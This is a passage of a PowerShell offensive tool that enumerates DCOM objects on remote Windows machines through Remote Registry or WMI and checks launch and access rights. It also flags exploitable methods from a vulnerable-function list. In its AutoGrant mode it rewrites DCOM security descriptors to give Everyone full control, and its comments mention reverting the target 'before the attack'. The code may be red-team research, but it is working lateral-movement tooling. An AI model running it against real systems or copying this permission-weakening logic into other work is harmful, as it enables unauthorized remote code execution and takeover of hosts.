    if(!$CheckAccessOnly) {
        Write-Log -Level INFO -Message "$($ObjectName).$($ObjectPath) Found!"
    }
    

}


function Read-File {
    param
    (
        [Parameter(Mandatory = $true)]
        [string]$FileName,
        [switch]$AsArray
    )
    # Read a file and get the results as a array or as a text
    if(!([System.IO.File]::Exists($FileName))) {
        Write-Log -Level ERROR -Message "$($FileName) file not found!"
        return $false
    }
    $reader = [System.IO.File]::OpenText($FileName)
    if($AsArray) {
        while($null -ne ($line = $reader.ReadLine())) { # Read until the line is empty
            if(!$line) {
                continue
            }
            %{ $line }
        }
        return
    }
    return $reader.ReadToEnd()

}

function Parse-FunctionListFile {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([bool])]
    param
    (
        [Parameter(Mandatory = $true)]
        [string]$FileLocation
    )
    <#
        This function is responsible to assigns the function patterns and the function name inside their variables.
        VulnerableMatchList's list store all the function name patterns.
        VulnerableFunctionList's list store all the exact function names.
    #>
    Write-Log -Level VERBOSE -Message "Parse function list from $($FileLocation)"

    $FunctionList = Read-File -FileName $FileLocation -AsArray
    if(!$functionList) {
        return $false
    }
    ForEach($functionName in $functionList) {
        if($functionName.Contains("*")) {
            $global:VulnerableMatchList.Add($functionName)|Out-Null
            continue
        }
        $global:VulnerableFunctionList.Add($functionName)|Out-Null
    }
    Write-Log -Level VERBOSE -Message "$($FileLocation) Parsed successfully!"
    return $true
    
}

function is-LoopBack {
    [OutputType([bool])]
    param(
        [Parameter(Mandatory = $true)]
        [string]$RemoteIP
    )

    # This function is responsible to check if the IP Address is a loopback address
    return (Find-InArray -Content $RemoteIP.ToLower() -Array @('localhost', '127.0.0.1'))
    
}

function Check-FunctionExploitationPossibility {
    [OutputType([System.Boolean])]
    param
    (
        [Parameter(Mandatory = $true)]
        [string]$OverloadDefinitions
    )

    # Checks if the function contains exploitable arguments
    $funcArgs = ($global:regexFunctionArgs.Match($OverloadDefinitions).Value).ToLower()
    if($funcArgs.Contains("string") -or $funcArgs.Contains("variant")) {
        return $true
    }
    return $false
}


function Find-VulnerableFunction {
    [OutputType([System.Boolean])]
    param
    (
        [Parameter(Mandatory = $true)]
        [string]$FunctionName
    )

    # Check if function name exists on the VulnerableFunctionList list
    if(Find-InArray -Content $FunctionName -Array $global:VulnerableFunctionList) {
        return $true
    }
    # Check if function name is contains patterns from the VulnerableMatchList list
    ForEach($FunctionPattern in $global:VulnerableMatchList) {
        if($FunctionName -like $FunctionPattern) {
            return $true
        }
    }
    return $false
}

function Check-TCPConnection {
    [OutputType([System.Boolean])]
    param
    (
        [Parameter(Mandatory = $true)]
        [string]$RemoteIP,
        [System.Int32]$Port,
        [system.int32]$Timeout=2500
        
    )
    # This function is responsible to check open ports (compatible with powershell version 2)
    $tcpConnection = new-Object system.Net.Sockets.TcpClient 
    $connect = $tcpConnection.BeginConnect($RemoteIP,$Port, $null,$null) 
    $wait = $connect.AsyncWaitHandle.WaitOne($Timeout,$false) 

    if($Wait -and $tcpConnection.Connected) {
        $tcpConnection.EndConnect($connect) | out-Null 
        return $true
    }
    return $false
}

function is-MaxResultsReached {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([System.Boolean])]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ObjectName,
        [system.Int32]$MaxResults
    )
    # This function is responsible to check if the max results is reached (Only if configured)
    if(!$MaxResults) {
        return $false
    }
    if(Find-InArray -Content $ObjectName -Array $global:totalResults.Keys) { # Check if we have collected results
        if($global:totalResults[$ObjectName] -ge $MaxResults) { # Check if we have reached the maximum of results
            Write-Log -Level VERBOSE -Message "Max results for $($ObjectName) has been reached"
            return $true
        }
    }
    return $false
}

# Registry functions 
# Due to the fact we have two methods to interact with the registry, each registry function will contain the implementation for both of the registry interaction.


function Test-RegistryConnection {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([System.Boolean])]
    param
    (
        [Parameter(Mandatory = $true)]
        [string]$RemoteIP,
        [ValidateSet("HKLM", "HKU", "HKCU")]
        [string]$Hive,
        [switch]$CheckWritePermissions
    )
    if(is-LoopBack -RemoteIP $RemoteIP) {
        $RemoteIP = $env:COMPUTERNAME
    }
    $global:ChoosenHive = $Hive
    Write-Log -Level VERBOSE -Message "Trying to interact with $($RemoteIP) using $($Hive) Hive"
    # This function is checking accessibility with Registry using wmi or remote-registry features
    $global:RegAuthenticationMethod = "RemoteRegistry"
    if(!(Connect-RemoteRegistry -RemoteIP $RemoteIP -CheckWritePermissions:$CheckWritePermissions -Hive $Hive)) { #  negotiate with remote-registry
        if(!(Connect-StdRegProv -RemoteIP $RemoteIP -Hive $Hive -CheckWritePermissions:$CheckWritePermissions)) { # Negotiaite ith WMI method
            return $false
        }
        $global:RegAuthenticationMethod = "StdRegProv"
    }
    
    return $true
}


function Test-RemoteRegistryNegotiation {
    [OutputType([System.Boolean])]
    param(
        [Parameter(Mandatory=$true)]
        [string]$RemoteIP,
        [ValidateSet("HKLM", "HKU", "HKCU")]
        [string]$Hive
    )
    
    $res = Invoke-NamedpipeMission -MissionInfo @{FunctionName="Test-RemoteRegistryNegotiation"; Arguments=@{RemoteIP=$RemoteIP; Hive=$Hive}}

    return $res.IsSuccess
}

function Check-RemoteRegistryPermission {
    [OutputType([System.Boolean])]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Key,
        [Parameter(Mandatory=$true)]
        [string]$RemoteIP,
        [switch]$CheckWritePermissions
    )
    

    $res = Invoke-NamedpipeMission -MissionInfo @{FunctionName="Check-RemoteRegistryPermission"; Arguments=@{Key=$Key; CheckWritePermissions=$CheckWritePermissions}}
    return $res.IsSuccess
}


function Connect-RemoteRegistry {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([System.Boolean])]
    param
    (
        [Parameter(Mandatory = $true)]
        [string]$RemoteIP,
        [switch]$CheckWritePermissions,
        [ValidateSet("HKLM", "HKU", "HKCU")]
        [string]$Hive
    )
    # This function is responsible to try to access remote-registry protocol (MS-RRP)
    if(!(Check-TCPConnection -RemoteIP $RemoteIP -Port 445)) { # Checks if SMB port is open.
        Write-Log -Level ERROR -Message "SMB port is closed, cant interact with Remote registry!"
        return $false
    }
    
    Write-Log -Level VERBOSE -Message "Trying to negotiate with Remote Registry ($Hive)"
    if(!(Test-RemoteRegistryNegotiation -RemoteIP $RemoteIP -Hive $Hive)) {
        Write-Log -Level ERROR -Message "Remote-Registry feature is disabled" -forceVerbose
        return $false
    }
    Write-Log -Level VERBOSE -Message "Remote-Registry enabled!"
    if(!(Check-RemoteRegistryPermission -RemoteIP $RemoteIP -Key "SOFTWARE\Classes\AppID" -CheckWritePermissions:$CheckWritePermissions)) {
        Write-Log -Level ERROR -Message "The access to the Remote-Registry denied!"
        return $false
    }
    
    Write-Log -Level VERBOSE -Message "Remote Registry negotiated successfully ($Hive)!"
    return $true

}

function Test-StdRegProvNegotiation {
    [OutputType([System.Boolean])]
    param(
        [Parameter(Mandatory=$true)]
        [string]$RemoteIP,
        [ValidateSet("HKLM", "HKU", "HKCU")]
        [string]$Hive
    )

    $res = Invoke-NamedpipeMission -MissionInfo @{FunctionName="Test-StdRegProvNegotiation"; Arguments=@{RemoteIP=$RemoteIP; Hive=$Hive}}
    return $res.IsSuccess
}

function Check-StdRegProvPermissions {
    [OutputType([System.Boolean])]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Key,
        [switch]$CheckWritePermissions
    )
    $res = Invoke-NamedpipeMission -MissionInfo @{FunctionName="Check-StdRegProvPermissions"; Arguments=@{Key=$Key; CheckWritePermissions=[bool]$CheckWritePermissions}}
    if($res.IsSuccess) {
        return $res.Result
    }
    return $false
    
}

function Check-RegistryPermission {
    param(
        [Parameter(Mandatory=$true)]
        [string]$RemoteIP,
        [Parameter(Mandatory=$true)]
        [string]$Key,
        [switch]$CheckWritePermissions
    )
    if($global:RegAuthenticationMethod -eq "StdRegProv") {
        return Check-StdRegProvPermissions -Key $Key -CheckWritePermissions:$CheckWritePermissions
    } else {
        return Check-RemoteRegistryPermission -Key $Key -RemoteIP $RemoteIP -CheckWritePermissions:$CheckWritePermissions
    }
}

function Connect-StdRegProv {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([System.Boolean])]
    param
    (
        [Parameter(Mandatory = $true)]
        [string]$RemoteIP,
        [ValidateSet("HKLM", "HKU", "HKCU")]
        [string]$Hive,
        [switch]$CheckWritePermissions

    )
    if(!(Check-TCPConnection -RemoteIP $RemoteIP -Port 135)) { # Checks if the RPC port is open.
        Write-Log -Level ERROR -Message "RPC port is closed, cant interact with StdRegProv!"
        return $false
    }
    # This function is responsible to try to authenticate to StdRegProv using WMI
    Write-Log -Level VERBOSE -Message "Trying to negotiate with StdRegProv ($Hive)"

    if(!(Test-StdRegProvNegotiation -RemoteIP $RemoteIP -Hive $Hive)) {
        Write-Log -Level ERROR -Message "StdRegProv feature is disabled" -forceVerbose
        return $false
    }
    Write-Log -Level VERBOSE -Message "StdRegProv enabled!"
    
    
    if(!(Check-StdRegProvPermissions -Key "Software\Classes\AppID" -CheckWritePermissions:$CheckWritePermissions)) {
        Write-Log -Level ERROR -Message "The access to the StdRegProv denied!"
        return $false
    }
    Write-Log -Level VERBOSE -Message "StdRegProv negotiated successfully ($Hive)!"
    return $true

}

function Add-RegSubkey {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([System.string])]
    param(
        [Parameter(Mandatory = $true)]
        [string]$KeyLocation,
        [Parameter(Mandatory = $true)]
        [string]$Key
    )
    $res = Invoke-NamedpipeMission -MissionInfo @{FunctionName="Add-RegSubkey"; Arguments=@{KeyLocation=$KeyLocation; Key=$Key}}
    $res.IsSuccess
    
}

function Remove-RegSubkey {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([System.string])]
    param(
        [Parameter(Mandatory = $true)]
        [string]$KeyLocation,
        [Parameter(Mandatory = $true)]
        [string]$Key
    )
    $res = Invoke-NamedpipeMission -MissionInfo @{FunctionName="Remove-RegSubkey"; Arguments=@{KeyLocation=$KeyLocation; Key=$Key}}
    $res.IsSuccess
    
}


function Read-RegString {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([System.string])]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Key,
        [string]$Value
    )
    $res = Invoke-NamedpipeMission -MissionInfo @{FunctionName="Read-RegString"; Arguments=@{Key=$Key; Value=$Value}}
    if($res.IsSuccess) {
        return $res.Result
    }
    
}


function Write-RegString {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([System.Boolean])]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Key,
        [string]$Value,
        [string]$String
        
    )
    $res = Invoke-NamedpipeMission -MissionInfo @{FunctionName="Write-RegString"; Arguments=@{Key=$Key; Value=$Value; String=$String}}
    return $res.IsSuccess
}

function Write-RegDWORD {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([System.Boolean])]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Key,
        [Parameter(Mandatory=$true)]
        [string]$Value,
        [Parameter(Mandatory=$true)]
        [long]$DWORD
        
    )
    $res = Invoke-NamedpipeMission -MissionInfo @{FunctionName="Write-RegDWORD"; Arguments=@{Key=$Key; Value=$Value; DWORD=$DWORD}}
    return $res.IsSuccess
}

function Remove-RegString {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([System.string])]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Key,
        [string]$Value
    )
    $res = Invoke-NamedpipeMission -MissionInfo @{FunctionName="Remove-RegString"; Arguments=@{Key=$Key; Value=$Value}}
    return $res.IsSuccess
    
}


function Read-RegBinary {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([System.Array])]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Key,
        [string]$Value
    )
    $res = Invoke-NamedpipeMission -MissionInfo @{FunctionName="Read-RegBinary"; Arguments=@{Key=$Key; Value=$Value}}
    if([bool]$res.IsSuccess) {
        return [byte[]]$res.Result
    }
    return [byte[]]@()
}

function Write-RegBinary {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([System.Boolean])]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Key,
        [Parameter(Mandatory = $true)]
        [string]$Value,
        [Parameter(Mandatory = $true)]
        [System.Array]$Bytes
    )
    
    $res = Invoke-NamedpipeMission -MissionInfo @{FunctionName="Write-RegBinary"; Arguments=@{Key=$Key; Value=$Value; Bytes=$Bytes}}
    return $res.IsSuccess

}

function Get-RegValueName {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([System.array])]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Key
    )
    $res = Invoke-NamedpipeMission -MissionInfo @{FunctionName="Get-RegValueName"; Arguments=@{Key=$Key}}
    if([bool]$res.IsSuccess) {
        return $res.Result
    }
    return @()

}


function Get-RegKeyName {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([System.array])]
    param(
        [string]$Key
    )
    $res = Invoke-NamedpipeMission -MissionInfo @{FunctionName="Get-RegKeyName"; Arguments=@{Key=$Key}}
    if([bool]$res.IsSuccess) {
        return $res.Result
    }
    return @()
}

# Registry Enumeration functions
function Get-CLSID {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([string])]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ProgID
    )
    # This function is responsible to Convert ProgID to CLSID
    foreach($pathLoc in @('SOFTWARE\Classes', 'SOFTWARE\Classes\WOW6432Node')) {
        $clsid = Read-RegString -Key "$($pathLoc)\$($ProgID)\CLSID" -Value ""
        if($clsid) {
            return Wrap-CLSID -ObjectName $clsid
        }
    }
    return ""
}

function Get-ObjectInfo {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([System.Array])]
    param(
        [Parameter(Mandatory = $true)]
        $ObjectName
    )
    
    # This function is responsible to get information of COM object

    # If the objectname is a ProgID, retrieve the CLSID in order to continue fetch information using it.
    if(is-GUID -ObjectName $ObjectName) {
        $clsid, $ProgID = @((Wrap-CLSID -ObjectName $ObjectName), "")
    } else {
        $clsid, $ProgID = @((Get-CLSID -ProgID $ObjectName), $ObjectName)
    }
    
    # In order to reduce registry calls, this operation will cache each object information in a general dictionary.
    if(!(Find-InArray -Content $clsid -Array $global:CachedObjectList.Keys)) {
        Write-Log -Level VERBOSE -Message "Fetching program information of $($clsid) Object"
        $archList = @(
                        @{"Arch"="32"; "Path"="SOFTWARE\Classes\CLSID\$($clsid)"},
                        @{"Arch"="64";"Path"="SOFTWARE\Classes\Wow6432Node\CLSID\$($clsid)"}
                    )
        $Library_32, $Library_64 = @("", "")
        foreach($archInfo in $archList) {
            $CLSIDValueNames = Get-RegValueName -Key $($archInfo.Path)
            $CLSIDKeyNames = Get-RegKeyName $($archInfo.Path)

            if(!$ProgID -and (Find-InArray -Content "VersionIndependentProgID" -Array $CLSIDKeyNames)) {
                $ProgID = Read-RegString -Key "$($archInfo.Path)\VersionIndependentProgID" -Value ""
            }
            if(!$ProgName  -and (Find-InArray -Content "" -Array $CLSIDValueNames)) {
                $ProgName = Read-RegString -Key  $archInfo.Path -Value ""
            }
            
            # Find the library file on the InProcServer32 key, otherwise, continue to find it on the LocalServer32 key
            
            foreach($LibraryName in @("InProcServer32", "LocalServer32")) {
                if(!(Find-InArray -Content $LibraryName -Array $CLSIDKeyNames)) {
                    continue
                }
                $LibraryLocation = Read-RegString -Key "$($archInfo.Path)\$($LibraryName)" -Value ""
                if($LibraryLocation) {
                    Set-Variable -Name "Library_$($archInfo.Arch)" -Value $LibraryLocation
                }
            }
            
            if(!(Get-Variable -Name "Library_$($archInfo.Arch)" -ValueOnly)) {
                Set-Variable -Name "Library_$($archInfo.Arch)" -Value ""
            }
            
        
        }
        $global:CachedObjectList[$clsid] = @($clsid, $ProgID, $ProgName, $Library_32, $Library_64)
    }
    return $global:CachedObjectList[$clsid]
    
    

}

function Get-CLSIDPath {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([System.Boolean])]
    param (
        [Parameter(Mandatory = $true)]
        [string]$clsid
    )
    
    # This function is responsible to resolve CLSID path
    foreach($RegistryLocation in @("SOFTWARE\Classes\AppID", "SOFTWARE\Classes\Wow6432Node\AppID")) {
        if(!(Find-InArray -Content $RegistryLocation -Array $global:AppIDDictionary.Keys)){
            $global:AppIDDictionary[$RegistryLocation] = Get-RegKeyName -Key $RegistryLocation
        }
        if(Find-InArray -Content $clsid -Array $global:AppIDDictionary[$RegistryLocation]) {
            return "$($RegistryLocation)\$($clsid)"
        }
    }
    return $false
}


function Get-DCOMObjectList {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([System.Array])]
    param
    (
        [Parameter(Mandatory = $true)]
        [string]$RemoteIP
    )
    # Fetch DCOM objects from registry
    $AllAppIDs = @() # list of all appids in order to substract appids from here once one of them already verified
    Write-Log -Level INFO -Message "Collecting CLSIDs (Go to make a coffee, it may take a time..)"

    foreach($RegistryPath in @('SOFTWARE\Classes\AppID', 'SOFTWARE\Classes\WOW6432Node\AppID')) { # Collect AppID list from each environment
        $global:AppIDDictionary[$RegistryPath] = Get-RegKeyName -Key $RegistryPath
        $AllAppIDs += $global:AppIDDictionary[$RegistryPath]
    }
    $AllAppIDs = $AllAppIDs|select -Unique
    $ScannedList = New-Object System.Collections.ArrayList # Contains scanned list

    foreach($RegistryPath in (@('SOFTWARE\Classes\CLSID', 'SOFTWARE\Classes\WOW6432Node\CLSID'))) { # Collects CLSIDS from 64bit and 32bit library
        foreach($clsid in (Get-RegKeyName -Key $RegistryPath| Sort-Object {Get-Random})) {
            
            if(!(is-GUID -ObjectName $clsid)) { # If the clsid is not GUID, skip to the next one
                continue
            }

            if(Find-InArray -Content $clsid -Array $ScannedList) { # If the CLSID already scanned, skip to the next one.
                continue
            }
            
            if(Find-InArray -Content $clsid -Array $AllAppIDs) { # If the clsid exists in the AppID list - it means the the CLSID is matched to the AppID
                $ScannedList.Add($clsid)|Out-Null
                %{ $clsid }
                continue
            }

            
            if(!(Find-InArray "AppID" -Array (Get-RegValueName -Key "$($RegistryPath)\$($clsid)"))) { # If the CLSID does not contains AppID, it probably not a DCOM object
                continue
            }

            $AppID = Read-RegString -Key "$($RegistryPath)\$($clsid)" -Value "AppID"
            if(!(Find-InArray -Content $AppID -Array $AllAppIDs)) {  # If the AppID does not stored on the DCOM AppID list, skip to the next one.
                continue
            }

            $ScannedList.Add($clsid)|Out-Null
            %{ $clsid }
            
        }
    }
    Write-Log -Level INFO -Message "CLSID list collected!" 

}


function Clone-ACL {
    [CmdletBinding(SupportsShouldProcess=$true)]
    param(
        [Parameter(Mandatory=$true)]
        [string]$RemoteIP,
        [Parameter(Mandatory=$true)]
        [string]$Path,
        [Parameter(Mandatory=$true)]
        [string]$Value
    )
    # This function is responsible to Generates ACL and DACL by converting SDDL of specific COM object.
    
    $emptyACL = New-Object System.Security.AccessControl.RegistrySecurity
    $bytes = Read-RegBinary -Key $Path -Value $Value
    if(!$bytes) { # If the path does not exist, it will set owner and group, then, return empty ACL
        [System.Security.Principal.SecurityIdentifier]$administrators = Get-GroupSID -RemoteIP $RemoteIP -GroupName "Administrators"
        $emptyACL.SetOwner($administrators)
        $emptyACL.SetGroup($administrators)
        return $emptyACL, @()
    }
    $sddl = $global:converter.Win32SDToSDDL($global:converter.BinarySDToWin32SD($bytes).Descriptor).SDDL # Convert BinarySD to SDDL
    $emptyACL.SetSecurityDescriptorSddlForm($sddl) # Attach SDDL on the empty ACL
    $DACL = (New-Object System.Security.AccessControl.RawSecurityDescriptor($bytes, 0)).DiscretionaryAcl
    
    return $emptyACL, $DACL

}

function Test-ACLPermission {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([System.Boolean])]
    param(
        [Parameter(Mandatory=$true)]
        [string]$RemoteIP,
        [Parameter(Mandatory=$true)]
        $DACL,
        [Parameter(Mandatory=$true)]
        $RequiredRights,
        [Parameter(Mandatory=$true)]
        $Groups
        
    )
    # This function is responsible to check whether the user is granted to perform write operations
    try {
        foreach($ace in $DACL) {
            if(!(Find-InArray -Content $ace.SecurityIdentifier -Array $Groups)) {
                continue
            }
            if(Find-InArray -Content $ace.AccessMask -Array $RequiredRights) {
                return $true
            }
        }
        return $false

    } catch {
        Write-Log -Level ERROR -Message $_ -forceVerbose
        return $false
    }
   
}


function Patch-ACL {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([System.Boolean])]
    param(
        [Parameter(Mandatory=$true)]
        [System.Security.AccessControl.NativeObjectSecurity]$ACL,
        [string]$Path,
        [string]$Value
    )

    try {
        # This function is responsible to patch ACL grant the relevant rights in order to get remote access to the potential DCOM object.

        $idRef = [System.Security.Principal.NTAccount]("Everyone")
        $acType = [System.Security.AccessControl.AccessControlType]::Allow
        $FullControl = [System.Security.AccessControl.RegistryRights]::FullControl
        foreach($ace in $ACL.Access) {
            $CurIdRef = $ace.IdentityReference
            $CurRegRights = $ace.RegistryRights
            $CurAcType = $ace.AccessControlType
            if($CurIdRef -ne $idRef) { # Skip on non-relevant identities
                continue
            }
            $RegistryAccessRule = New-Object -TypeName System.Security.AccessControl.RegistryAccessRule -ArgumentList @($CurIdRef, $CurRegRights, $CurAcType)
            $ACL.RemoveAccessRule($RegistryAccessRule)|Out-Null # Removes the rights we already have
        
        }
        
        # set a full control rule
        $RegistryAccessRule = New-Object -TypeName System.Security.AccessControl.RegistryAccessRule -ArgumentList @($idRef, $FullControl, $acType)
        $ACL.SetAccessRule($RegistryAccessRule)|Out-Null

        # Converts SDDL to BinarySD and write the role on the registry
        $sdBytes = ($global:converter.SDDLToBinarySD($ACL.Sddl)).BinarySD
        return Write-RegBinary -Key $Path -Value $Value -Bytes $sdBytes

    } catch {
        Write-Log -Level ERROR -Message $_ -forceVerbose
        return $false
    }
   
}

function Rev2Self {
    [CmdletBinding(SupportsShouldProcess=$true)]
    param()
    # This function is responsible to restore the remote machine to the previous state before the attack.
    if($global:IsDCOMStatusChanged) { # If Remote DCOM feature was disabled, and we had enabled it, disable it again
        Write-RegString -Key "SOFTWARE\Microsoft\Ole" -Value "EnableDCOM" -String "N"|Out-Null
        $global:IsDCOMStatusChanged = $false
    }
    if($global:aclSnapshots.Count -eq 0) {
        Write-Log -Level VERBOSE -Message "No snapshots found." -forceVerbose
        return
    }
    Write-Log -Level INFO "Reverting to the previous snapshots.."
    $global:aclSnapshots|ForEach {
        $emptyACL = New-Object System.Security.AccessControl.RegistrySecurity # Create empty ACL
        $emptyACL.SetSecurityDescriptorSddlForm($_.SDDL) # Attach the previous SDDL
        $sdBytes = ($global:converter.SDDLToBinarySD($emptyACL.Sddl)).BinarySD # Convert to binary
        if(!(Write-RegBinary -Key $_.Path -Value $_.Value -Bytes $sdBytes)) { # Write on registry
            Write-log -Level ERROR -Message "Reverting $($_.Path)\$($_.Value) Failed!"
            continue
        }
    }
    
    
}


function Invoke-SecurityRightAnalyzer {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([System.Boolean])]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Path,
        [Parameter(Mandatory=$true)]
        [System.Object]$PermissionHashTable,
        [Parameter(Mandatory = $true)]
        [bool]$DefaultResult,
        [Parameter(Mandatory = $true)]
        [string]$RemoteIP,
        [switch]$AutoGrant
    )
    <#
        This function is responsible to check if our identity has the permissions to access and launch remote/local DCOM Object.
        if we did not have the relevant permissions on the remote machine, and AutoGrant mode is on, the tool will grant our logged-on user rights and returns "true"
        otherwise, we will returns "false", which indicates that we don't have the permissions to the DCOM object
    #>
    
    $Keys = {$($PermissionHashTable.Keys|?{$_})}.Invoke() # Clone PermissionHashTable keys
    
    
    foreach($record in $keys) {
        if($PermissionHashTable[$record]['Status']) { # Skip on already granted keys
            continue
        }
        $ACL, $DACL = Clone-ACL -Path $Path -Value $record -RemoteIP $RemoteIP
        $PermisisonType = $PermissionHashTable[$record]['Type']
        # If the ACL is exists, then, check if the user is already granted or empty.
        # If is empty, assign it as approved
        if($DACL.Count -eq 0 -and ($PermisisonType -eq "Launch" -or ($PermisisonType -eq "Access" -and (is-DomainJoinedUserSession -RemoteIP $RemoteIP)))) {
            foreach($AdministrativeGroup in @((Get-GroupSID -RemoteIP $RemoteIP -GroupName "Administrators"), (Get-GroupSID -RemoteIP $RemoteIP -GroupName "Domain admins"))) {
                if(Find-InArray -Content $AdministrativeGroup -Array $global:usergroups) {
                    $PermissionHashTable[$record]['Status'] = $true
                    break
                }
                $PermissionHashTable[$record]['Status'] = $DefaultResult
            }
        }
        if(is-LoopBack -RemoteIP $RemoteIP) {
            $RequiredRights = Iif -Condition ($PermisisonType -eq "Launch") -Right $global:LocalLaunchAndActivationRights -Wrong $global:LocalAccessRights
        } else {
            $RequiredRights = Iif -Condition ($PermisisonType -eq "Launch") -Right $global:RemoteLaunchAndActivationRights -Wrong $global:RemoteAccessRights
        }
        $Groups = $global:usergroups
        if($PermisisonType -eq "Access" -and (!(is-DomainJoinedUserSession -RemoteIP $RemoteIP))) {
            $Groups = @(Get-GroupSID -RemoteIP $RemoteIP -GroupName "Everyone")
        }
        if(Test-ACLPermission -RemoteIP $RemoteIP -DACL $DACL -RequiredRights $RequiredRights -Groups $Groups) {
           $PermissionHashTable[$record]['Status'] = $true
           continue 
        }
        # If we dont have rights, and we set AutoGrant mode, set full control rights
        
        if($AutoGrant) {
            if(!(Check-RegistryPermission -RemoteIP $RemoteIP -Key $Path -CheckWritePermissions)) {
                Write-Log -Level ERROR -Message "Can't patch permissions for $($Path) (Access is denied)"
                continue
            }
            $global:aclSnapshots.Add(@{Path=$Path; Value=$record; SDDL=$ACL.sddl})|Out-Null # Store SDDL Before attack
            if(!(Patch-ACL -ACL $ACL -Path $Path -Value $record)) { # If the patching operation fails, remove the last snapshot
                Write-Log -Level ERROR "Patching $($Path)\$($record) permissions Failed" -forceVerbose
                $global:aclSnapshots.RemoveAt($global:aclSnapshots.Count-1)| Out-Null
                continue
            }
            Write-Log -Level VERBOSE "$($Path)\$($record) permissions patched successfully!"
            $PermissionHashTable[$record]['Status'] = $true
        }
    }
    ForEach($perm in $PermissionHashTable.Values) {
        if(!$perm['Status']) { # If one of the relevant permissions is not granted, return false
            return $false
        }
    }
    return $true

}

function Invoke-DefaultRightAnalyzer {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([System.Boolean])]
    param(
        [Parameter(Mandatory=$true)]
        [string]$RemoteIP,
        [switch]$AutoGrant
    )
    <#
        This function is responsible to check if we have the default relevant rights to access the DCOM Object.
        If not, and AutoGrant mode is set, we will grant ourselves full control permissions
    #>

    $PermissionStatus = @{ # Required values to check/patch
        DefaultLaunchPermission=@{Status=$false; "Type"="Launch"};
        MachineLaunchRestriction=@{Status=$false; "Type"="Launch"};
    }
    if(!(is-LoopBack -RemoteIP $RemoteIP)) {
        $PermissionStatus['DefaultAccessPermission'] = @{Status=$false; "Type"="Access"};
        $PermissionStatus['MachineAccessRestriction'] = @{Status=$false; "Type"="Access"};
    }
    $status = Invoke-SecurityRightAnalyzer -Path "SOFTWARE\Microsoft\Ole" -PermissionHashTable $PermissionStatus -RemoteIP $RemoteIP -DefaultResult $false -AutoGrant:$AutoGrant
    if($status) {
        Write-Log -Level VERBOSE -Message "Your identity is granted launch and access DCOM objects with default configuration!"
    }
    return $status
}

function Invoke-DCOMObjectRightAnalyzer {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([System.Boolean])]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ObjectName,
        [Parameter(Mandatory=$true)]
        [string]$RemoteIP,
        [switch]$DefaultChecks,
        [switch]$AutoGrant
    )
    
    <#
        This function is responsible to check if we have permissions to access the DCOM Object.
        If not, and AutoGrant mode is set, we will grant ourselves full control permissions
    #>
    
    if(!(is-GUID -ObjectName $objectName)) { # If the ObjectName is not CLSID, fetch it
        $clsid = Get-CLSID -ProgID $ObjectName
        if(!$clsid) {
            Write-Log -Level ERROR -Message "Can't reach $($clsid) object!" -forceVerbose
            return
        }
    } else {
        $clsid = Wrap-CLSID -ObjectName $ObjectName
    }
    $ObjectPath = Get-CLSIDPath -clsid $clsid
    # Sometimes, not all the objects appear in the AppID list, and when that is the situation, the OS will enforce the default rights
    if(!$ObjectPath) {
        return $DefaultChecks
    }
    $PermissionStatus = @{ # Required values to check/patch
        LaunchPermission=@{"Status"=$false; "Type"="Launch"};
    }
    if(!(is-LoopBack -RemoteIP $RemoteIP)) {
        $PermissionStatus['AccessPermission'] = @{"Status"=$false; "Type"="Access"};
    }
    $existsKeys = Get-RegValueName -Key $ObjectPath
    $Keys = {$($PermissionStatus.Keys|?{$_})}.Invoke() # Clone PermissionStatus list
    foreach($valName in $Keys) { # If the DCOM Object does not contain the required values, remove them, it supposed to be based on the default rights
        if(!(Find-InArray -Content $valName -Array $existsKeys)) {
            $PermissionStatus.Remove($valName)
        }
    }

    if($PermissionStatus.Count -eq 0) { # If the registry key of the DCOM permissions does not exists, the machine will use default DCOM permissions
        Write-Log -Level VERBOSE -Message "$($ObjectName) is using with the default permissions!"
        return $DefaultChecks
    }

    $status = Invoke-SecurityRightAnalyzer -RemoteIP $RemoteIP -Path $ObjectPath -PermissionHashTable $PermissionStatus -AutoGrant:$AutoGrant -DefaultResult $DefaultChecks
    
    if($status) {
        Write-Log -Level VERBOSE -Message "Your identity is granted to launch and access the $($ObjectName) object!sssss"
    }
    return $status
}

# DCOM functions


function Start-COMObjectInstance {
    param(
        [Parameter(Mandatory = $true)]
        [string]$ObjectName,
        [Parameter(Mandatory = $true)]
        [string]$RemoteIP
    )
    Write-Log -Level VERBOSE -Message "Trying to interact with $($ObjectName) object"
